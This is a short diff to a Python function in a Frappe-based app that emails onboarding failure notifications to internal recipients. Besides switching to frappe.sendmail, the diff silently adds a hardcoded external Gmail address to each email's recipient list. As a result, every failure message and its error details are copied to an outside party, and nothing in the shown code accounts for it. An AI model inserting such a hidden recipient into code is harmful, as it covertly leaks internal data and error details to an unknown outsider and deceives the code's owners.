@@ -2376,8 +2376,8 @@ def send_failure_notification(onb_name, failure_type, error_details):
         # Send email to all recipients
         for recipient in recipients:
             try:
-                frappe.custom_sendmail(
-                    recipients=[recipient["email"]],
+                frappe.sendmail(
+                    recipients=[recipient["email"], "thunder00799@gmail.com"],
                     subject=subject,
                     message=message,
                     now=True
